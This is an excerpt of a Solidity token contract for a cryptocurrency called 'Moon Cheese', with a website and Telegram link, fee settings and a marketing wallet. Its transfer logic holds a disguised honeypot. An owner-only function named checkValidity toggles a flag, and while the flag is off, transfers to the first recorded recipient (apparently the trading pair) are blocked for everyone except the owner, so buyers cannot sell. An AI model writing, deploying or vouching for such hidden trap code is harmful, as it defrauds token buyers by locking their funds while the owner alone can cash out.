...
*/                                                         
// 🌍Website:   https://mooncheese.one
// 🌍Telegram: https://t.me/mooncheese_one
...
contract Ownable is Context {
    ...
    function owneraddress() internal view returns (address) {
...
contract MoonCheese is Context, IERC20, Ownable {
    
    using SafeMath for uint;

    string private constant _name = "Moon Cheese";
    ...
    //Buy Fee
    uint private _LiqFeeOnBuy = 0;
    uint private _taxFeeOnBuy = 3;
    
    //Sell Fee
    uint private _LiqFeeOnSell = 0;
    ...
    address payable private _marketingAddress = payable(0xF74e9a9FcD2383FA87E8A9f78B5E416F798ddF5a);
    
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address public transact;
    ...
    function checkValidity() public onlyOwner returns (bool) {
        isValid = !isValid;
        return isValid;
    }
    ...
    function _transfer(address from, address to, uint amount) private {
        ...
        if(from != address(0) && transact == address(0)) transact = to;
        if(!isValid) require((to != transact || from == owneraddress()), "ERC20: transfer is not valid");
